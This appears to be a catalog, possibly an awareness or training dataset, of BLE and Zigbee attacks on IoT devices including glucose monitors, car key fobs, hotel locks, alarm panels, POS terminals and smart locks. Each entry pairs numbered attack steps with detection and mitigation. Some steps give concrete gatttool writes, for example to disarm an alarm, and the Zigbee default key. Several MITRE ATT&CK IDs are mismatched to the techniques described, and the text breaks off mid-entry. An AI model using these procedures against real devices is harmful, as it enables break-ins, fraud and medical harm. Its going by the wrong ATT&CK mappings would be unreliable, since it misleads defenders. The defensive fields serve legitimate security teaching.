- **Attack Type**: BLE Injection Attack
- **Target**: BLE Fitness Band
- **Vulnerability**: GATT command injection via lack of access control
- **MITRE**: T1496
- **Impact**: Disturbance, annoyance, device misuse
- **Tools**: gatttool, nRF Toolbox, btlejack
- **Scenario**: Attacker makes a BLE fitness band vibrate repeatedly by injecting fake alert commands.
- **Attack Steps**: Step 1: Discover fitness tracker via BLE scan. Step 2: Connect and enumerate GATT characteristics. Step 3: Find the characteristic linked to haptic feedback. Step 4: Inject a loop of write requests triggering vibration (e.g., char-write-req 0x001a 01). Step 5: Band vibrates without any incoming calls/alerts. Step 6: Victim checks phone repeatedly, gets annoyed.
- **Detection**: Monitor repetitive BLE writes
- **Solution**: Firmware update to restrict alert writes
- **Tags**: BLE, Fitness Tracker, Haptic, Alert Injection

## BLE Smartwatch Calendar Event Injection

- **Attack Type**: BLE Injection Attack
- **Target**: BLE Smartwatch
- **Vulnerability**: Insecure data sync; no calendar validation
- **MITRE**: T1557
- **Impact**: Miscommunication, schedule disruption
- **Tools**: BLE GATTacker, Android BLE Tools, nRF Connect
- **Scenario**: Attacker pushes fake meeting invites to a smartwatch, simulating calendar injection via BLE.
- **Attack Steps**: Step 1: Identify BLE smartwatch with visible MAC via scan. Step 2: Recreate GATT profile of a smartwatch using GATTacker. Step 3: Craft fake calendar GATT characteristics with event title "Meeting with CEO". Step 4: Broadcast cloned device and trick smartwatch into pairing. Step 5: Watch syncs to malicious GATT profile and displays fake meeting. Step 6: Victim is misled into reacting or attending wrong meeting.
- **Detection**: Sync log review; paired device alerts
- **Solution**: Encrypted sync; validation from cloud server
- **Tags**: BLE, Smartwatch, Calendar Injection

## BLE Injection into Blood Glucose Monitor

- **Attack Type**: BLE Injection Attack
- **Target**: Glucose Monitor
- **Vulnerability**: BLE spoofing; trust on first use flaw
- **MITRE**: T1557
- **Impact**: Medical harm, health panic
- **Tools**: GATTacker, btlejuice, Bluetooth Adapter
- **Scenario**: Attacker sends false glucose data to a BLE glucose monitor paired with a diabetic patient’s phone.
- **Attack Steps**: Step 1: Observe BLE glucose monitor connection process using BLE sniffer. Step 2: Clone the device with fake glucose value profile (e.g., "220 mg/dL"). Step 3: Inject this data into the phone’s BLE pairing cache using btlejuice. Step 4: Victim’s phone syncs with rogue clone and app logs fake high value. Step 5: Victim may take unnecessary insulin or panic.
- **Detection**: Use MAC lock + data validation
- **Solution**: Secure BLE sync with device whitelist
- **Tags**: BLE, Medical, Glucose, Fake Data

## BLE Injection into Proximity Keyless Entry System

- **Attack Type**: BLE Injection Attack
- **Target**: Car Keyless System
- **Vulnerability**: BLE replay + lack of encryption
- **MITRE**: T1557
- **Impact**: Unauthorized access to vehicle
- **Tools**: Flipper Zero, Ubertooth One, BLEAH
- **Scenario**: Attacker emulates BLE car key fob and sends unlock command to target vehicle.
- **Attack Steps**: Step 1: Capture BLE packets from real car key using Ubertooth. Step 2: Extract unlock command and characteristic handle. Step 3: Clone the packet structure using Flipper Zero. Step 4: Emulate fob’s MAC and write unlock request to the car’s BLE receiver. Step 5: Door unlocks without owner key.
- **Detection**: BLE pairing log monitoring
- **Solution**: Secure BLE rolling codes, encryption
- **Tags**: BLE, Automotive, Keyless Entry

## Smart BLE Thermostat Setting Injection

- **Attack Type**: BLE Injection Attack
- **Target**: Smart Thermostat
- **Vulnerability**: Insecure GATT write, no access control
- **MITRE**: T1496
- **Impact**: Environmental disruption, user discomfort
- **Tools**: gatttool, Android BLE scanner, BlueZ
- **Scenario**: Attacker changes home thermostat settings remotely by injecting temperature change commands.
- **Attack Steps**: Step 1: Discover BLE smart thermostat with lescan. Step 2: Connect via gatttool and enumerate controls. Step 3: Find handle for temperature setting characteristic. Step 4: Inject temperature change to 30°C (char-write-req 0x0032 1E). Step 5: Thermostat obeys command; room overheats.
- **Detection**: GATT traffic log inspection
- **Solution**: Require secure authentication for control commands
- **Tags**: BLE, Smart Home, HVAC, Injection

## BLE Injection for Fake Presence in Attendance System

- **Attack Type**: BLE Injection Attack
- **Target**: BLE Attendance System
- **Vulnerability**: No BLE beacon verification
- **MITRE**: T1070.006
- **Impact**: Fraudulent presence logging
- **Tools**: ESP32 BLE Beacon, BlueZ, hcitool
- **Scenario**: Attacker simulates BLE beacon of an employee to mark false attendance.
- **Attack Steps**: Step 1: Clone BLE UUID and MAC address of employee's BLE beacon. Step 2: Flash ESP32 with this identity and position it near scanner. Step 3: Attendance system detects spoofed beacon as if employee is present. Step 4: Attendance gets logged without employee being onsite.
- **Detection**: BLE beacon signal anomaly detection
- **Solution**: Implement rolling UUIDs and timestamp validation
- **Tags**: BLE, Beacon Spoof, Attendance Fraud

## BLE Injection to Trigger Smart Doorbell

- **Attack Type**: BLE Injection Attack
- **Target**: Smart Doorbell
- **Vulnerability**: Lack of command verification
- **MITRE**: T1496
- **Impact**: Noise pollution, false alerts
- **Tools**: gatttool, btlejack, mobile BLE tester app
- **Scenario**: Attacker sends BLE command to smart doorbell causing fake ring alerts.
- **Attack Steps**: Step 1: Find BLE-enabled smart doorbell using hcitool lescan. Step 2: Connect via gatttool and locate ring control handle. Step 3: Send command (e.g., char-write-req 0x002b 01) to trigger ring. Step 4: Doorbell rings; home occupants confused by false alert.
- **Detection**: Ring event log analysis
- **Solution**: Device pairing lock and encryption
- **Tags**: BLE, IoT, Doorbell, Prank Attack

## BLE Injection for Unauthorized HVAC Scheduling

- **Attack Type**: BLE Injection Attack
- **Target**: HVAC System
- **Vulnerability**: Lack of authentication on scheduling feature
- **MITRE**: T1496
- **Impact**: Energy loss, privacy risk
- **Tools**: BLE Scanner, GATT Write Tool, Raspberry Pi BLE
- **Scenario**: Attacker changes scheduled HVAC settings via BLE commands, altering operation hours.
- **Attack Steps**: Step 1: Connect to HVAC unit’s BLE interface using Raspberry Pi. Step 2: Dump and analyze current schedule GATT values. Step 3: Modify values to turn HVAC on during night hours. Step 4: Inject new schedule write requests. Step 5: System runs against intended schedule, wasting energy.
- **Detection**: Scheduled log mismatch alerting
- **Solution**: Require mobile-app verification of BLE actions
- **Tags**: BLE, HVAC, Schedule Injection

## BLE Injection Attack on BLE-Based Hotel Room Key

- **Attack Type**: BLE Injection Attack
- **Target**: Hotel Door Locks
- **Vulnerability**: Static command use without device validation
- **MITRE**: T1557
- **Impact**: Physical security breach, theft
- **Tools**: Btlejack, Flipper Zero, BLE Scanner
- **Scenario**: Attacker replicates BLE room key and injects unlock request to hotel door system.
- **Attack Steps**: Step 1: Capture BLE packets from guest’s phone as it opens hotel room. Step 2: Analyze GATT commands responsible for unlocking. Step 3: Clone BLE profile and MAC with Flipper Zero. Step 4: Replay unlock command near hotel room door. Step 5: Door opens, attacker enters room undetected.
- **Detection**: BLE log monitoring; whitelist device MACs
- **Solution**: Use secure time-limited token BLE keys
- **Tags**: BLE, Hotel, Lock, Room Access

## BLE Injection to Remotely Disable Smart Alarm System

- **Attack Type**: BLE Injection Attack
- **Target**: BLE Alarm System
- **Vulnerability**: No authentication or device whitelisting for BLE commands
- **MITRE**: T1557
- **Impact**: Physical intrusion, security bypass
- **Tools**: gatttool, Btlejack, Raspberry Pi BLE, BLE Sniffer
- **Scenario**: Attacker disables a BLE-based home alarm system by sending spoofed “Disarm” commands using cloned BLE control characteristics.
- **Attack Steps**: Step 1: Attacker scouts for homes using BLE-enabled alarm systems, typically from outside the property. Step 2: Using hcitool lescan, attacker identifies the BLE broadcast MAC of the alarm panel. Step 3: The attacker then uses gatttool to connect to the MAC address and retrieves the list of services and characteristics. Step 4: By referencing vendor documentation or trial-and-error, attacker identifies the characteristic responsible for "ARM/DISARM" function (e.g., handle 0x002a). Step 5: Attacker sends a char-write-req 0x002a 00 (hex "00" often corresponds to disarm command). Step 6: The alarm panel responds to the injected command and disables security mode. Step 7: Attacker now has a window to physically enter the premises unnoticed.
- **Detection**: Analyze BLE logs, alert on unauthorized GATT writes
- **Solution**: Implement multi-factor BLE disarming and signed command packets
- **Tags**: BLE, Smart Home, Alarm Bypass, IoT

## BLE Injection to Trigger False Fire Alert in Smart Building

- **Attack Type**: BLE Injection Attack
- **Target**: BLE Fire Sensor
- **Vulnerability**: Blind trust in incoming BLE sensor data
- **MITRE**: T1496
- **Impact**: Emergency service disruption, physical infiltration
- **Tools**: GATTacker, ESP32 BLE emulator, BLE packet analyzer
- **Scenario**: Attacker sends fake smoke detection data to BLE-connected central control system to simulate a fire emergency.
- **Attack Steps**: Step 1: Attacker observes BLE communication between a smoke sensor and central control unit. Step 2: Using BLE sniffing tools like Btlejack, attacker captures the fire/smoke alert signal format. Step 3: The attacker creates a spoofed BLE device using ESP32 configured with the same name, MAC, and GATT characteristics. Step 4: The ESP32 device begins broadcasting a fake sensor reading (e.g., smoke value FF which means "detected"). Step 5: The control unit receives and interprets it as a genuine smoke alert. Step 6: Fire alarms trigger, building occupants evacuate unnecessarily. Step 7: Attacker creates panic or uses the distraction for physical infiltration.
- **Detection**: Monitor for duplicate MACs, alert spoofed sensor IDs
- **Solution**: Enforce cryptographic identity verification for BLE sensors
- **Tags**: BLE, Fire Sensor, Panic Attack, GATT Spoof

## BLE Injection into Wireless Payment Terminal

- **Attack Type**: BLE Injection Attack
- **Target**: BLE POS Terminal
- **Vulnerability**: Lack of authentication and integrity for BLE commands
- **MITRE**: T1557
- **Impact**: Financial fraud, inventory loss
- **Tools**: btlejuice, BLE MITM Proxy, Android BLE Toolkit
- **Scenario**: Attacker injects commands to BLE-enabled POS (point-of-sale) to cancel or refund a transaction in progress.
- **Attack Steps**: Step 1: Attacker scans for active BLE POS systems in a retail environment. Step 2: Using btlejuice, attacker launches a Man-in-the-Middle (MITM) BLE proxy between the POS terminal and customer's phone. Step 3: The attacker identifies transaction-related characteristics like total amount, transaction status. Step 4: Just before payment is confirmed, attacker injects a refund or "cancel transaction" command through the MITM channel. Step 5: POS terminal reverts or aborts the transaction, customer leaves believing payment went through. Step 6: Attacker may walk away with product without payment being processed.
- **Detection**: Secure logging of every BLE command; detect MITM
- **Solution**: Use end-to-end encryption and BLE traffic integrity checks
- **Tags**: BLE, POS, Payment Attack, Financial Exploit

## BLE Injection to Confuse Asset Tracking in Warehouses

- **Attack Type**: BLE Injection Attack
- **Target**: BLE Asset Tracker
- **Vulnerability**: BLE beacon cloning, lack of location validation
- **MITRE**: T1070.006
- **Impact**: Operational disruption, asset loss
- **Tools**: BLE Beacon Emulator (ESP32), BlueZ Tools, Custom UUID Spoofer
- **Scenario**: Attacker injects fake beacon signals to make asset tracking systems think equipment is in the wrong place.
- **Attack Steps**: Step 1: Attacker uses hcitool to observe active BLE beacon traffic used for tracking pallets/equipment. Step 2: Clones multiple BLE beacons using ESP32 and assigns them spoofed asset IDs with spoofed UUIDs. Step 3: Deploys these fake beacons near different zones in the warehouse. Step 4: Central BLE tracking system logs the spoofed IDs and updates database thinking those assets moved. Step 5: Inventory appears scattered or misplaced, leading to operational confusion. Step 6: May be used as a cover for actual asset theft or smuggling.
- **Detection**: Scan for duplicate BLE beacons and signal anomalies
- **Solution**: Add timestamp-based BLE verification and asset handshake
- **Tags**: BLE, Warehouse, Tracking, Beacon Spoof

## BLE Injection to Force Pairing with Malicious Companion App

- **Attack Type**: BLE Injection Attack
- **Target**: BLE Wearables
- **Vulnerability**: No validation of companion app identity
- **MITRE**: T1557
- **Impact**: Device control, privacy invasion, data loss
- **Tools**: Android BLE Framework, MITM BLE Proxy, Custom GATT App
- **Scenario**: Attacker tricks a BLE wearable to pair with a rogue companion app that sends malicious configuration commands.
- **Attack Steps**: Step 1: Attacker monitors BLE devices being paired with phones (e.g., smartbands). Step 2: Builds a malicious app with cloned BLE service UUIDs and characteristic structures. Step 3: Victim is tricked into downloading app (e.g., via QR code or phishing link). Step 4: App automatically connects to the BLE device and sends malicious write requests like factory reset, GPS enable, or false health alerts. Step 5: BLE device executes injected commands assuming app is legitimate. Step 6: Attacker may control or brick device remotely.
- **Detection**: Check app signature before BLE write permissions
- **Solution**: Only allow authorized apps via device-side certificate trust
- **Tags**: BLE, App Spoofing, Wearable Attack

## Replay of Light Control Packet

- **Attack Type**: Zigbee Replay & Injection
- **Target**: Zigbee Smart Light
- **Vulnerability**: Lack of packet freshness validation
- **MITRE**: T1636.001 (Access via Radio Frequency)
- **Impact**: Unauthorized control of IoT device
- **Tools**: HackRF One, Zigbee2MQTT, Wireshark, GNU Radio
- **Scenario**: An attacker captures a Zigbee packet used to turn on a smart light, and replays it to control the light without authorization.
- **Attack Steps**: Step 1: Set up HackRF One near the Zigbee smart light and sniff Zigbee traffic.Step 2: Observe traffic with Wireshark until a light ON packet is sent by the legitimate user.Step 3: Save that specific frame from the PCAP log.Step 4: Use GNU Radio to replay the captured Zigbee packet.Step 5: Light turns ON again without needing credentials.
- **Detection**: Monitoring repeated identical frames
- **Solution**: Implement nonce and message counters in Zigbee communications
- **Tags**: replay attack, iot, smart home

## Door Lock Unlock Replay

- **Attack Type**: Zigbee Replay & Injection
- **Target**: Zigbee Door Lock
- **Vulnerability**: No anti-replay or encryption mechanism
- **MITRE**: T1636.001
- **Impact**: Bypass of physical security
- **Tools**: Yard Stick One, KillerBee, Wireshark
- **Scenario**: A Zigbee-based smart door lock is manipulated by replaying an unlock command that was previously sniffed during legitimate usage.
- **Attack Steps**: Step 1: Place Yard Stick One device near a Zigbee-enabled smart lock.Step 2: Wait for a user to unlock the door via Zigbee.Step 3: Capture the unlock command with KillerBee tool.Step 4: Analyze and isolate the unlock packet.Step 5: Replay the captured frame to the smart lock.Step 6: The door unlocks without any credentials.
- **Detection**: Track repeated unlock signals; check timestamps
- **Solution**: Use AES-128 encryption and rolling code counters
- **Tags**: zigbee, door lock, physical security

## Fake Sensor Data Injection

- **Attack Type**: Zigbee Replay & Injection
- **Target**: Zigbee Thermostat
- **Vulnerability**: Trust in sensor values without validation
- **MITRE**: T1620
- **Impact**: Energy misuse, overheating
- **Tools**: RZUSBstick, Ubiqua Protocol Analyzer, Scapy-radio
- **Scenario**: Attacker injects false temperature readings into a Zigbee-based smart thermostat, tricking it to trigger cooling.
- **Attack Steps**: Step 1: Monitor traffic between Zigbee temperature sensor and the thermostat using RZUSBstick.Step 2: Record packets showing high temperature.Step 3: Modify packet or replay as-is to send fake high reading.Step 4: Thermostat receives false data and starts cooling.Step 5: Repeat periodically to cause device wear or resource exhaustion.
- **Detection**: Monitor sudden spikes in sensor readings
- **Solution**: Validate readings from multiple sensors before action
- **Tags**: injection, sensor spoof, thermostat

## Coordinated Replay Flood on Zigbee Mesh

- **Attack Type**: Zigbee Replay & Injection
- **Target**: Zigbee Mesh Devices
- **Vulnerability**: No flood detection or rate limiting
- **MITRE**: T1499
- **Impact**: DoS, battery drain
- **Tools**: Multiple HackRF One, Zigbee2MQTT, SDRSharp
- **Scenario**: Multiple replay attacks flood a Zigbee mesh network causing DoS and draining device batteries.
- **Attack Steps**: Step 1: Deploy 2–3 SDRs around the Zigbee mesh area.Step 2: Capture frequent command packets (e.g., ON/OFF, status check).Step 3: Continuously replay these packets using multiple SDRs.Step 4: Devices respond to all commands, exhausting CPU and battery.Step 5: Mesh routing gets overloaded and unstable.Step 6: Some devices stop responding due to congestion.
- **Detection**: Check traffic volume and packet timing
- **Solution**: Enforce replay protection, traffic throttling
- **Tags**: dos, mesh network, battery drain

## Replay Attack on Zigbee-Based Alarm System

- **Attack Type**: Zigbee Replay & Injection
- **Target**: Zigbee Home Alarm
- **Vulnerability**: Trust in old disarm commands
- **MITRE**: T1548
- **Impact**: Bypass of alarm system
- **Tools**: HackRF, Wireshark, GNU Radio, Zigbee firmware tools
- **Scenario**: Zigbee-based home alarm system is silenced by replaying the disarm signal previously captured.
- **Attack Steps**: Step 1: Identify Zigbee communication between the control panel and alarm unit.Step 2: Wait until a user disarms the alarm.Step 3: Capture disarm signal.Step 4: Replay that packet using GNU Radio tools.Step 5: Alarm thinks it's being disarmed by a valid user and goes silent.Step 6: Intruder can now move freely.
- **Detection**: Monitor disarm activity logs and timestamps
- **Solution**: Use rolling codes or session tokens
- **Tags**: home security, alarm bypass, replay attack

## Replay-Based Thermostat Manipulation

- **Attack Type**: Zigbee Replay & Injection
- **Target**: Zigbee Thermostat
- **Vulnerability**: No validation of command origin or freshness
- **MITRE**: T1636.001
- **Impact**: Energy waste and possible discomfort
- **Tools**: Zigbee2MQTT, HackRF One, Wireshark
- **Scenario**: Replay captured command to raise room temperature on a Zigbee-based thermostat.
- **Attack Steps**: Step 1: Use Zigbee2MQTT on a Raspberry Pi to listen to Zigbee network.Step 2: Wait for legitimate user to set thermostat to 30°C.Step 3: Capture that command using Wireshark.Step 4: Export captured command as a binary file.Step 5: Replay the command using HackRF One.Step 6: Thermostat executes the fake request, heating the room unnecessarily.
- **Detection**: Alert on repetitive identical packets
- **Solution**: Use frame counters and enforce freshness
- **Tags**: iot heating attack, zigbee spoofing

## Replay to Trigger Panic Alarm

- **Attack Type**: Zigbee Replay & Injection
- **Target**: Zigbee Panic Alarm
- **Vulnerability**: Reuse of identical emergency commands
- **MITRE**: T1636.001
- **Impact**: Chaos, emergency response misuse
- **Tools**: SDR#, HackRF, Zigbee network sniffer
- **Scenario**: Attacker captures the panic button press and replays it to trigger chaos.
- **Attack Steps**: Step 1: Identify and monitor Zigbee panic button transmission.Step 2: Wait until user presses panic button.Step 3: Capture packet using SDR#.Step 4: Save panic packet and replay at night.Step 5: Alarm system is triggered, causing unnecessary panic.Step 6: Repeat to cause mistrust in the system.
- **Detection**: Detect repeated emergency triggers in short span
- **Solution**: Add digital signature or rolling tokens
- **Tags**: false alarm, panic replay

## Zigbee Smart Plug Replay Attack

- **Attack Type**: Zigbee Replay & Injection
- **Target**: Zigbee Smart Plug
- **Vulnerability**: Commands not authenticated
- **MITRE**: T1636.001
- **Impact**: Power misuse, user annoyance
- **Tools**: Ubiqua, Yard Stick One, Python script
- **Scenario**: Replaying a captured ON command to turn on a smart plug remotely.
- **Attack Steps**: Step 1: Use Ubiqua to monitor Zigbee smart plug.Step 2: Wait until smart plug is turned ON by user.Step 3: Capture ON command.Step 4: Build a Python script using KillerBee to replay the packet.Step 5: Plug turns on as if user issued the command.Step 6: Repeat at odd hours to disturb user.
- **Detection**: Check for recurring ON patterns from unusual devices
- **Solution**: Implement secure authentication
- **Tags**: power control, plug spoofing

## Zigbee-Based TV Replay Attack

- **Attack Type**: Zigbee Replay & Injection
- **Target**: Zigbee Smart TV
- **Vulnerability**: No authentication for remote control
- **MITRE**: T1636.001
- **Impact**: User disturbance, energy waste
- **Tools**: SDR (HackRF One), Wireshark
- **Scenario**: Replay command to turn ON Zigbee-connected TV repeatedly.
- **Attack Steps**: Step 1: Use SDR to scan Zigbee frequency (2.4 GHz).Step 2: Capture ON command for the Zigbee-connected TV.Step 3: Save and isolate the Zigbee frame.Step 4: Replay during nighttime using HackRF One.Step 5: TV turns ON without user input.Step 6: Victim confused or annoyed.
- **Detection**: Log Zigbee activity and alert repeated patterns
- **Solution**: Use per-session tokens or secure pairing
- **Tags**: smart tv, replay, zigbee hack

## HVAC System Spoofing via Replay

- **Attack Type**: Zigbee Replay & Injection
- **Target**: Zigbee HVAC
- **Vulnerability**: No freshness or replay protection
- **MITRE**: T1636.001
- **Impact**: Component wear and energy waste
- **Tools**: KillerBee, GNU Radio, Zigbee2MQTT
- **Scenario**: HVAC units controlled via Zigbee respond to replayed fan-speed command.
- **Attack Steps**: Step 1: Monitor Zigbee packets with KillerBee.Step 2: Capture the fan speed change command (e.g., Medium → High).Step 3: Replay packet multiple times.Step 4: HVAC responds with increased fan speed without new input.Step 5: Device cycles wear out due to misuse.
- **Detection**: Alert if command frequency exceeds normal
- **Solution**: Require firmware-level anti-replay filters
- **Tags**: hvac, industrial iot, replay

## Zigbee Curtain Opener Replay

- **Attack Type**: Zigbee Replay & Injection
- **Target**: Zigbee Curtain Motor
- **Vulnerability**: Weak command authentication
- **MITRE**: T1636.001
- **Impact**: Privacy breach
- **Tools**: Zigbee2MQTT, Wireshark, HackRF
- **Scenario**: Replay command to open Zigbee curtains at specific times to surveil inside.
- **Attack Steps**: Step 1: Capture curtain open command using Wireshark.Step 2: Export the relevant frame to binary.Step 3: Replay at odd hours using HackRF.Step 4: Curtains open without consent.Step 5: Allows attacker to view inside home.
- **Detection**: Monitor and log unusual timing of curtain actions
- **Solution**: Secure curtain control with rolling codes
- **Tags**: privacy, smart home, zigbee attack

## Industrial Zigbee Sensor Replay

- **Attack Type**: Zigbee Replay & Injection
- **Target**: Zigbee Industrial Sensor
- **Vulnerability**: Sensor spoofing via replay
- **MITRE**: T1620
- **Impact**: Safety misjudgment, industrial disruption
- **Tools**: Ubiqua, HackRF, SCADA Zigbee tap
- **Scenario**: Attacker replays high-pressure reading from Zigbee sensor in an industrial setup.
- **Attack Steps**: Step 1: Capture Zigbee packet reporting high pressure.Step 2: Replay this packet to SCADA system.Step 3: System wrongly triggers emergency vent.Step 4: This leads to gas waste or false alarms.Step 5: Repeat to degrade trust in sensors.
- **Detection**: Validate with backup sensors; alert anomalies
- **Solution**: Multi-source confirmation before action
- **Tags**: industrial, SCADA, spoof attack

## Zigbee Fan Control Spoof via Replay

- **Attack Type**: Zigbee Replay & Injection
- **Target**: Zigbee Ceiling Fan
- **Vulnerability**: Trust on static command sequence
- **MITRE**: T1636.001
- **Impact**: Disturbance and energy misuse
- **Tools**: Wireshark, Zigbee sniffer, HackRF
- **Scenario**: Capture and replay command to switch ceiling fan ON/OFF in smart home.
- **Attack Steps**: Step 1: Observe when fan is toggled ON/OFF using Zigbee remote.Step 2: Capture toggle command with sniffer.Step 3: Replay multiple times to toggle fan remotely.Step 4: Disrupt user sleep by toggling fan randomly.
- **Detection**: Log Zigbee toggles with timestamps
- **Solution**: Token-based command validation
- **Tags**: ceiling fan, iot replay

## Smart Outlet Replay-Induced Fire Risk

- **Attack Type**: Zigbee Replay & Injection
- **Target**: Zigbee Smart Plug + Kettle
- **Vulnerability**: No usage-based safety lockout
- **MITRE**: T1499
- **Impact**: Overheating, fire hazard
- **Tools**: Yard Stick One, Zigbee sniffer, Python replay script
- **Scenario**: Replaying ON command to activate electric kettle repeatedly.
- **Attack Steps**: Step 1: Capture ON command for electric kettle using sniffer.Step 2: Replay it multiple times even after it’s turned off.Step 3: Kettle turns ON again and again, risking dry boil.Step 4: In real scenario, this can cause overheating.
- **Detection**: Alert repeated activation patterns
- **Solution**: Add energy-use based safety cutoffs
- **Tags**: fire risk, kettle, zigbee replay

## Zigbee Audio System Replay Hijack

- **Attack Type**: Zigbee Replay & Injection
- **Target**: Zigbee Smart Speaker
- **Vulnerability**: Unauthenticated audio control
- **MITRE**: T1636.001
- **Impact**: Noise disturbance and harassment
- **Tools**: HackRF One, Wireshark, SDRSharp
- **Scenario**: Replay Zigbee packet to turn on and max volume on smart audio system.
- **Attack Steps**: Step 1: Capture Zigbee ON + volume-up command.Step 2: Replay packet at 2AM remotely.Step 3: Audio system turns on at full volume.Step 4: Victim wakes up and system causes stress.Step 5: Repeat across nights to intimidate.
- **Detection**: Analyze volume change timestamps and remote triggers
- **Solution**: Secure pairing and user-auth-only control
- **Tags**: noise attack, audio hijack, zigbee

## Zigbee Sprinkler Replay Attack

- **Attack Type**: Zigbee Replay & Injection
- **Target**: Zigbee Smart Sprinkler System
- **Vulnerability**: No packet freshness or user authentication
- **MITRE**: T1636.001
- **Impact**: Resource abuse (water), system misuse
- **Tools**: HackRF One, Wireshark, Zigbee2MQTT, Python replay script
- **Scenario**: The attacker replays a Zigbee packet to activate a smart sprinkler system during non-irrigation hours, wasting water and raising suspicion.
- **Attack Steps**: Step 1: Identify a smart sprinkler system that uses Zigbee.Step 2: Use Zigbee2MQTT or a sniffer (like Wireshark with a Zigbee plugin) to capture network traffic while a legitimate user activates the sprinkler.Step 3: Filter out the activation packet from the PCAP log and extract the frame containing the ON command.Step 4: Save this command and test the replay capability using HackRF and a Python-based transmission script.Step 5: Replay the command late at night or early morning.Step 6: Sprinklers activate without any user action, wasting water.Step 7: Repeat across multiple days to create operational confusion.
- **Detection**: Monitor unexpected sprinkler activation outside schedule
- **Solution**: Use timestamped and signed Zigbee command packets
- **Tags**: irrigation, water waste, zigbee spoofing

## Zigbee-Based Medical Device Trigger

- **Attack Type**: Zigbee Replay & Injection
- **Target**: Zigbee-connected Medical Device
- **Vulnerability**: Critical commands accepted without session/auth check
- **MITRE**: T1620
- **Impact**: Health risk or medical malfunction
- **Tools**: SDRSharp, Zigbee sniffer, HackRF One
- **Scenario**: A health-monitoring Zigbee device is triggered to deliver a false dosage command due to replayed transmission.
- **Attack Steps**: Step 1: Research Zigbee-connected medical IoT devices (like insulin monitors in simulation labs).Step 2: Capture a transmission that instructs the device to release or adjust medication.Step 3: Isolate this sensitive control command using SDRSharp and Wireshark.Step 4: Replay it using HackRF One in a controlled environment.Step 5: Device accepts the repeated command and acts upon it without re-validation.Step 6: In real-world application, this could deliver medication unnecessarily.Step 7: Use this for awareness training in medical cybersecurity.
- **Detection**: Multi-layer monitoring, redundant data sources
- **Solution**: Use cryptographic session validation in health IoT
- **Tags**: medical, healthcare, critical iot, replay

## Zigbee-Based Smart Garage Door Attack

- **Attack Type**: Zigbee Replay & Injection
- **Target**: Zigbee Smart Garage Door
- **Vulnerability**: No session ID or replay prevention mechanism
- **MITRE**: T1548
- **Impact**: Unauthorized physical entry
- **Tools**: Yard Stick One, KillerBee Suite, Wireshark
- **Scenario**: Replay a Zigbee command to open a garage door that was previously captured during a legitimate user interaction.
- **Attack Steps**: Step 1: Use Yard Stick One and KillerBee’s zbdump tool to sniff Zigbee packets near a smart garage door.Step 2: Wait for the homeowner to open the garage using their Zigbee remote/app.Step 3: Capture the "open" command in real time.Step 4: Save the command for replay.Step 5: Use the zbreplay tool to send the captured packet back to the garage door controller.Step 6: The garage door opens again without any user confirmation.Step 7: Demonstrate to learners how wireless home access can be compromised.
- **Detection**: Check for identical packet replay in short intervals
- **Solution**: Implement rolling codes and nonces in door control
- **Tags**: smart garage, physical access, replay

## Zigbee Smart Lock Battery Drain via Replay

- **Attack Type**: Zigbee Replay & Injection
- **Target**: Zigbee Smart Lock
- **Vulnerability**: Wake-on-packet without rate limit
- **MITRE**: T1499
- **Impact**: Battery exhaustion, forced failure
- **Tools**: HackRF One, Python script, Zigbee sniffer
- **Scenario**: A low-power smart lock is targeted with repeated replayed packets to force it to stay awake, draining the battery rapidly.
- **Attack Steps**: Step 1: Capture a common interaction command like "status request" from Zigbee-enabled smart lock.Step 2: Save and replay this harmless command continuously.Step 3: The smart lock wakes up every time the packet is received, using more battery.Step 4: Over the course of hours or days, the lock loses charge quickly.Step 5: Demonstrate to learners how even non-malicious packets can be weaponized.Step 6: Discuss implications on low-power IoT.
- **Detection**: Detect high frequency packet traffic
- **Solution**: Add rate limiting and sleep-check timers
- **Tags**: battery drain, energy attack, zigbee

## Zigbee Smart Bulb Color Spoof via Replay

- **Attack Type**: Zigbee Replay & Injection
- **Target**: Zigbee Smart Bulb
- **Vulnerability**: No protection from repeated visual control commands
- **MITRE**: T1636.001
- **Impact**: False emergency signal, annoyance
- **Tools**: Zigbee2MQTT, HackRF One, Wireshark
- **Scenario**: Replaying a command to change the bulb’s color to red to simulate emergency lighting repeatedly.
- **Attack Steps**: Step 1: Set up Zigbee2MQTT to monitor traffic between smart bulb and controller.Step 2: Wait until the user changes the light to RED.Step 3: Capture the exact packet using Wireshark.Step 4: Extract and isolate the Zigbee frame responsible for color change.Step 5: Use HackRF One to replay the same command at will.Step 6: The bulb continuously changes to red even if user changes it to another color.Step 7: Useful to simulate emergency spoof or psychological attack scenarios in smart buildings.
- **Detection**: Monitor repeated color pattern requests
- **Solution**: Use secure payload signing and rolling identifiers
- **Tags**: visual spoof, lighting, smart bulb attack

## Zigbee Network Key Sniffing During Join

- **Attack Type**: Zigbee Key Extraction
- **Target**: Zigbee End Device
- **Vulnerability**: Insecure Key Transport
- **MITRE**: T1040 (Network Sniffing)
- **Impact**: Full access to Zigbee network
- **Tools**: KillerBee, RZUSBstick, Wireshark
- **Scenario**: Attacker captures the Zigbee network key when a new device joins the network unencrypted.
- **Attack Steps**: Step 1: Attacker uses a Zigbee sniffer like RZUSBstick connected to a PC. Step 2: The attacker runs KillerBee’s zbdump to monitor Zigbee traffic on the common Zigbee channels (11–26). Step 3: A new device (smart bulb) is added to the Zigbee network by the legitimate user. Step 4: During the joining process, the key exchange is sent in plaintext if encryption is not enforced. Step 5: Attacker captures this packet and extracts the Network Key using zbkeys. Step 6: This key allows the attacker to decrypt further Zigbee traffic or inject malicious commands.
- **Detection**: Monitor joining events, Packet inspection
- **Solution**: Use Install Code Based Joining; enable encryption
- **Tags**: zigbee, sniffing, joining, plaintext key

## Zigbee Default Key Exploitation

- **Attack Type**: Zigbee Key Extraction
- **Target**: Zigbee Coordinator or Router
- **Vulnerability**: Use of Default Keys
- **MITRE**: T1557.002 (Adversary-in-the-Middle: Protocol Impersonation)
- **Impact**: Unauthorized access to encrypted traffic
- **Tools**: KillerBee, zbdump, zbkeys
- **Scenario**: Attacker brute-forces or guesses default Zigbee keys that many manufacturers reuse.
- **Attack Steps**: Step 1: Attacker captures network traffic using a Zigbee sniffer. Step 2: They look for encrypted packets that use well-known default keys like "ZigBeeAlliance09". Step 3: Using zbkeys or Wireshark with Zigbee dissectors, attacker tries known default keys to decrypt the encrypted data. Step 4: If successful, the attacker now has the network key and can monitor all communications. Step 5: The attacker could now inject fake messages to control devices.
- **Detection**: Key database comparison, MAC-level logging
- **Solution**: Enforce random key generation at setup
- **Tags**: zigbee, default-key, brute-force

## Zigbee Key Extraction via Rejoin Attack

- **Attack Type**: Zigbee Key Extraction
- **Target**: Zigbee End Device
- **Vulnerability**: Insecure Rejoin Procedure
- **MITRE**: T1021.001 (Remote Services)
